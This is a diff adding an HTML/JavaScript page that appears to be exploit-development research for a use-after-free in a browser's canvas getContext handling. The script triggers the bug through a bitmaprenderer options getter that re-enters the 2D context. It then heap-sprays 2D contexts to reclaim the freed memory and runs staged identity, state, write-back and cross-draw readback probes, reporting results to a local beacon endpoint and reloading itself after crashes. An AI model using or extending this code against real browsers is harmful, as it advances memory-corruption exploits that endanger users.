@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V925 - canvas UAF alias discriminator (14.20 base, VC-03)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #3fb950; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V925 - Canvas getContext UAF alias discriminator (14.20 base)</h1>
+<p class="key"><b>Hypothesis (VC-03):</b> after bitmaprenderer+alpha-getter trigger, the stale 2D <code>CTX</code> aliases a <b>live reclaimed 2D context</b> (spray) rather than showing no identity. Reclaim with real <code>getContext('2d')</code> contexts (default <code>n=80</code>, set <code>&amp;n=</code> to tune 20-200) carrying unique markers/canvas ids, then test identity/state, write-back visibility, cross-draw/readback (p554d-style), and <code>roundRect</code> survival. <b>Not proof of free-before-use</b>; discriminating beacons. Crash-detected, paced, no address scan. If you see system-memory pressure, reopen with <code>&amp;n=40</code> after a cold boot/restart.</p>
+<pre id="out">starting...</pre>
+<script>
+'use strict';
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k){ try { return window.localStorage.getItem('v925_' + k); } catch(e){ return null; } }
+function lsSet(k,v){ try { window.localStorage.setItem('v925_' + k, String(v)); } catch(e){} }
+function lsDel(k){ try { window.localStorage.removeItem('v925_' + k); } catch(e){} }
+
+function bks(tag, body){
+  var u = '/beacon/V925-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch(e){ try { var i = new Image(); i.src = u; } catch(e2){} }
+}
+
+var O = document.getElementById('out');
+function say(s){ O.textContent += '\n' + s; }
+function errOf(e){ return e ? String(e.name||'Error') + ':' + String(e.message||'').slice(0,80) : 'none'; }
+function reloadSoon(ms){ setTimeout(function(){ location.href = SEEK + '?op=auto&n=' + NSPRAY + '&saves=' + NSAVES + (MODE==='compact'?'&mode=compact':'') + '&r=' + Date.now(); }, ms); }
+
+var CTX = null, HASRR = false, KEEP = null, ORIG_CANVAS = null;
+var NSPRAY = (function(){ var m = location.search.match(/[?&]n=(\d+)/); var n = m ? parseInt(m[1],10) : 20; if (isNaN(n)||n<8) n=8; if (n>120) n=120; return n; })();
+var MODE = (location.search.indexOf('mode=compact') >= 0) ? 'compact' : 'staged';
+var NSAVES = (function(){ var m = location.search.match(/[?&]saves=(\d+)/); var n = m ? parseInt(m[1],10) : 4; if (isNaN(n)||n<0) n=0; if (n>32) n=32; return n; })();
+
+function trigger(canvas, nsaves){
+  var saved = null, hasRR = false;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function(){
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try { hasRR = (typeof ctx.roundRect === 'function'); } catch(e0){}
+      try {
+        ctx.lineWidth = 3.14159; ctx.miterLimit = 7.77; ctx.globalAlpha = 0.42;
+        ctx.lineDashOffset = 2.222; ctx.shadowBlur = 5.55;
+        for (var s = 0; s < nsaves; s++) ctx.save();
+        ctx.lineWidth = 1.2345;
+      } catch(e){}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch(e2){}
+  return { saved: saved, bmp: bmp, hasRR: hasRR };
+}
+
+function spray2d(count){
+  var keep = [];
+  for (var i = 0; i < count; i++){
+    var c = document.createElement('canvas');
+    c.width = 2; c.height = 2; c.id = 'v925s' + i;
+    var cx = null;
+    try { cx = c.getContext('2d'); } catch(e){}
+    if (cx){
+      try {
+        cx.lineWidth = 1000 + i;
+        cx.globalAlpha = 0.01 * ((i % 90) + 1);
+        cx.shadowBlur = i % 64;
+        cx.miterLimit = 10 + (i % 20);
+        try { cx.__v925 = i; } catch(e3){}
+      } catch(e2){}
+      keep.push({ c: c, cx: cx, i: i });
+    }
+  }
+  KEEP = keep;
+  return keep.length;
+}
+
+function triesOf(){ var t = parseInt(lsGet('tries')||'0',10); return isNaN(t)?0:t; }
+function bumpTry(){ var t = triesOf()+1; lsSet('tries', t); return t; }
+var STAGES = ['id','state','writeback','crossdraw','rr'];
+function stageIdx(s){ for (var i=0;i<STAGES.length;i++) if (STAGES[i]===s) return i; return 0; }
+function curStage(){ return lsGet('stage')||STAGES[0]; }
+function advance(msg){
+  var i = stageIdx(curStage());
+  if (i+1 < STAGES.length){ lsSet('stage', STAGES[i+1]); lsDel('tries'); bks('ADV', STAGES[i]+'->'+STAGES[i+1]+(msg?','+msg:'')); }
+  else { lsSet('phase','done'); bks('DONE','all stages done'); }
+}
+function step(tag, label, fn){
+  var st = curStage(), t = bumpTry();
+  bks(tag+'-PRE','stage='+st+',try='+t+','+label);
+  say(tag+' '+label+' try='+t);
+  lsSet('pending', st+':'+tag);
+  var err = null, res;
+  try { res = fn(); } catch(e){ err = e; }
+  lsDel('pending');
+  if (err){ bks(tag+'-ERR','stage='+st+',try='+t+','+errOf(err)); say(tag+' ERR '+errOf(err)); return {ok:false}; }
+  var rstr = (res==null?'':String(res)).slice(0,420);
+  bks(tag+'-OK','stage='+st+','+rstr);
+  say(tag+' OK '+rstr);
+  return {ok:true,res:res};
+}
+function px(cx){
+  try { var d=cx.getImageData(0,0,1,1).data; return d[0]+','+d[1]+','+d[2]+','+d[3]; }
+  catch(e){ return 'err:'+errOf(e); }
+}
+
+function main(){
+  var q = location.search;
+  if (q.indexOf('reset=1') >= 0){
+    lsDel('pending'); lsDel('loads'); lsDel('phase'); lsDel('stage'); lsDel('tries');
+    bks('RESET','cleared'); say('cleared. reopen ?op=auto'); return;
+  }
+  var loads = parseInt(lsGet('loads')||'0',10)+1;
+  lsSet('loads', loads);
+  if (loads > 140){ bks('GIVEUP','loads='+loads); say('give up - reset'); return; }
+  var pend = lsGet('pending');
+  if (pend){
+    lsDel('pending');
+    var t = triesOf();
+    bks('CRASH','pending='+pend+',try='+t+',load='+loads);
+    say('CRASH pending='+pend+' try='+t);
+    if (t >= 2){ bks('BLACKLIST', pend); advance('crashx2'); reloadSoon(3500); return; }
+    say('retrying'); reloadSoon(3500); return;
+  }
+  if (lsGet('phase') === 'done'){ say('done. reset with ?reset=1'); bks('ALREADY','done'); return; }
+
+  var st = curStage();
+  bks('BOOT','load='+loads+',stage='+st+',n='+NSPRAY+',saves='+NSAVES+',mode='+MODE+',ua='+navigator.userAgent.slice(0,64));
+  say('load='+loads+' stage='+st+' n='+NSPRAY+' saves='+NSAVES+' mode='+MODE);
+
+  ORIG_CANVAS = document.createElement('canvas'); ORIG_CANVAS.width = 1; ORIG_CANVAS.height = 1; ORIG_CANVAS.id = 'v925orig';
+  document.body.appendChild(ORIG_CANVAS); window._v925orig = ORIG_CANVAS;
+
+  bks('TRIG-PRE','saves='+NSAVES);
+  lsSet('pending','trig');
+  var tr = trigger(ORIG_CANVAS, NSAVES);
+  lsDel('pending');
+  if (!tr.saved){ bks('ERR','trigger-failed'); reloadSoon(3000); return; }
+  CTX = tr.saved; HASRR = tr.hasRR;
+  bks('TRIG-POST','saved=1,rr='+HASRR);
+  bks('PREFLIGHT','rr='+HASRR+',saves='+NSAVES);
+
+  bks('SPRAY-PRE','n='+NSPRAY);
+  var nctx = spray2d(NSPRAY);
+  bks('ARM','2dctx='+nctx+',stage='+st+',mode='+MODE);
+  say('sprayed '+nctx+' 2d contexts');
+
+  if (MODE === 'compact'){
+    /* best-effort all discriminators in one load to reduce reload/memory overhead */
+    bks('COMPACT-PRE','all');
+    lsSet('pending','compact:ALL');
+    var cres = {};
+    try {
+      try { cres.ctxCanvasId = CTX.canvas ? String(CTX.canvas.id||'(noid)') : 'null'; } catch(e1){ cres.ctxCanvasId='err'; }
+      try { cres.sameAsOrig = (CTX.canvas === ORIG_CANVAS); } catch(e2){ cres.sameAsOrig='err'; }
+      cres.sameAsSpray = -1;
+      for (var i=0;i<KEEP.length;i++){ try { if (CTX.canvas === KEEP[i].c){ cres.sameAsSpray=KEEP[i].i; break; } } catch(e3){} }
+    } catch(ea){ cres.idErr=errOf(ea); }
+    bks('COMPACT-ID', JSON.stringify(cres).slice(0,420));
+    try {
+      var lw='na',ga='na',sb='na'; try{lw=CTX.lineWidth;}catch(e){} try{ga=CTX.globalAlpha;}catch(e2){} try{sb=CTX.shadowBlur;}catch(e3){}
+      var m=[]; for (var j=0;j<KEEP.length;j++){ try{ if(KEEP[j].cx.lineWidth===lw) m.push(KEEP[j].i);}catch(e4){} if(m.length>8) break; }
+      bks('COMPACT-STATE','lw='+lw+',ga='+ga+',sb='+sb+',lwMatchIdx='+m.join('|'));
+    } catch(eb){ bks('COMPACT-STATE-ERR', errOf(eb)); }
+    try {
+      try{ CTX.lineWidth=7777; }catch(e5){}
+      var hits=[], stale='na'; try{stale=CTX.lineWidth;}catch(e6){}
+      for (var k=0;k<KEEP.length;k++){ try{ if(KEEP[k].cx.lineWidth===7777) hits.push(KEEP[k].i);}catch(e7){} if(hits.length>12) break; }
+      bks('COMPACT-WB','staleLw='+stale+',sprayHitIdx='+hits.join('|')+',hitN='+hits.length);
+    } catch(ec){ bks('COMPACT-WB-ERR', errOf(ec)); }
+    try {
+      try{ CTX.fillStyle='rgb(255,0,0)'; CTX.fillRect(0,0,1,1);}catch(e8){}
+      var red=[],spx='na'; try{spx=px(CTX);}catch(e9){}
+      for (var m2=0;m2<KEEP.length;m2++){ var p=px(KEEP[m2].cx); if(p.indexOf('255,0,0')===0) red.push(KEEP[m2].i); if(red.length>12) break; }
+      bks('COMPACT-XDRAW','stalePx='+spx+',redIdx='+red.join('|')+',redN='+red.length);
+    } catch(ed){ bks('COMPACT-XDRAW-ERR', errOf(ed)); }
+    try {
+      if (HASRR){ CTX.beginPath(); CTX.roundRect(10,10,100,100,5); bks('COMPACT-RR','ok'); } else bks('COMPACT-RR','norr');
+    } catch(ee){ bks('COMPACT-RR-ERR', errOf(ee)); }
+    lsDel('pending');
+    lsSet('phase','done');
+    bks('DONE','compact-complete,n='+NSPRAY);
+    say('compact complete'); return;
+  }
+
+  if (st === 'id'){
+    var r = step('ID','canvas-identity', function(){
+      var cid = 'na', sameOrig='na', sameSpray=-1;
+      try { cid = CTX.canvas ? String(CTX.canvas.id||'(noid)') : 'null'; } catch(e){ cid='err:'+errOf(e); }
+      try { sameOrig = (CTX.canvas === ORIG_CANVAS); } catch(e2){ sameOrig='err'; }
+      for (var i=0;i<KEEP.length;i++){
+        try { if (CTX.canvas === KEEP[i].c){ sameSpray = KEEP[i].i; break; } } catch(e3){}
+      }
+      return 'ctxCanvasId='+cid+',sameAsOrig='+sameOrig+',sameAsSpray='+sameSpray;
+    });
+    advance(r.ok?'id-ok':'id-err'); reloadSoon(3000); return;
+  }
+  if (st === 'state'){
+    var r2 = step('STATE','read-stale-state', function(){
+      var lw='na',ga='na',sb='na',ml='na',cv='na',x='na';
+      try { lw = CTX.lineWidth; } catch(e){ lw='err'; }
+      try { ga = CTX.globalAlpha; } catch(e2){ ga='err'; }
+      try { sb = CTX.shadowBlur; } catch(e3){ sb='err'; }
+      try { ml = CTX.miterLimit; } catch(e4){ ml='err'; }
+      try { cv = CTX.canvas ? CTX.canvas.id : 'nocanvas'; } catch(e5){ cv='err'; }
+      try { x = CTX.__v925; } catch(e6){ x='err'; }
+      var matches=[];
+      for (var i=0;i<KEEP.length;i++){
+        try { if (KEEP[i].cx.lineWidth === lw && KEEP[i].i >= 0) matches.push(KEEP[i].i); } catch(e7){}
+        if (matches.length>8) break;
+      }
+      return 'lw='+lw+',ga='+ga+',sb='+sb+',ml='+ml+',cv='+cv+',expando='+x+',lwMatchIdx='+matches.join('|');
+    });
+    advance(r2.ok?'state-ok':'state-err'); reloadSoon(3000); return;
+  }
+  if (st === 'writeback'){
+    var r3 = step('WB','stale-write-scan-spray', function(){
+      var setok='na';
+      try { CTX.lineWidth = 7777; setok='ok'; } catch(e){ setok='err:'+errOf(e); }
+      var hits=[], errc=0;
+      for (var i=0;i<KEEP.length;i++){
+        try { if (KEEP[i].cx.lineWidth === 7777) hits.push(KEEP[i].i); }
+        catch(e2){ errc++; }
+        if (hits.length>12) break;
+      }
+      var staleRead='na'; try { staleRead = CTX.lineWidth; } catch(e3){ staleRead='err'; }
+      return 'set='+setok+',staleLw='+staleRead+',sprayHitIdx='+hits.join('|')+',hitN='+hits.length+',errc='+errc;
+    });
+    advance(r3.ok?'wb-ok':'wb-err'); reloadSoon(3000); return;
+  }
+  if (st === 'crossdraw'){
+    var r4 = step('XDRAW','stale-fillRect-then-spray-readback', function(){
+      var fillok='na', stalePx='na';
+      try { CTX.fillStyle = 'rgb(255,0,0)'; CTX.fillRect(0,0,1,1); fillok='ok'; } catch(e){ fillok='err:'+errOf(e); }
+      try { stalePx = px(CTX); } catch(e2){ stalePx='err'; }
+      var redHits=[], samples=[];
+      for (var i=0;i<KEEP.length;i++){
+        var p = px(KEEP[i].cx);
+        if (i<3) samples.push(i+':'+p);
+        if (p.indexOf('255,0,0')===0) redHits.push(KEEP[i].i);
+        if (redHits.length>12) break;
+      }
+      return 'fill='+fillok+',stalePx='+stalePx+',redIdx='+redHits.join('|')+',redN='+redHits.length+',samp='+samples.join(';');
+    });
+    advance(r4.ok?'xd-ok':'xd-err'); reloadSoon(3000); return;
+  }
+  if (st === 'rr'){
+    if (!HASRR){ bks('NORR','roundRect-unavailable'); advance('norr'); reloadSoon(3000); return; }
+    var r5 = step('RR','beginPath+roundRect-on-stale', function(){ CTX.beginPath(); CTX.roundRect(10,10,100,100,5); return 'survived'; });
+    advance(r5.ok?'rr-ok':'rr-err'); reloadSoon(3000); return;
+  }
+  advance('unknown'); reloadSoon(3000);
+}
+
+try { main(); } catch(e){ bks('FATAL', String(e && (e.message||e)).slice(0,200)); say('FATAL '+e); }
+</script>
+</body>
+</html>
